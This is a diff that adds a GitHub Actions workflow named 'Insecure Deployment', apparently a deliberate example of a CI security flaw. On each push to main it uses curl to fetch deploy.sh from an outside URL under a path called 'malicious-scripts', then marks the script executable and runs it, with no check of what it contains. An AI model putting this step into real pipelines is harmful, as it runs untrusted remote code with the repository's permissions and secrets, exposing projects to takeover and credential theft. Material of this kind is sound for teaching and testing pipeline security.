@@ -1,0 +1,21 @@
+name: Insecure Deployment
+
+on:  
+  push:  
+    branches:  
+      - main  
+
+jobs:  
+  deploy:  
+    runs-on: ubuntu-latest  
+
+    steps:  
+      - name: Checkout Repository  
+        uses: actions/checkout@v3  
+
+      - name: Download and Execute External Script  
+        run: |  
+          curl -o deploy.sh https://linustimodaniels.github.io/malicious-scripts/deploy.sh
+  
+          chmod +x deploy.sh  
+          ./deploy.sh  
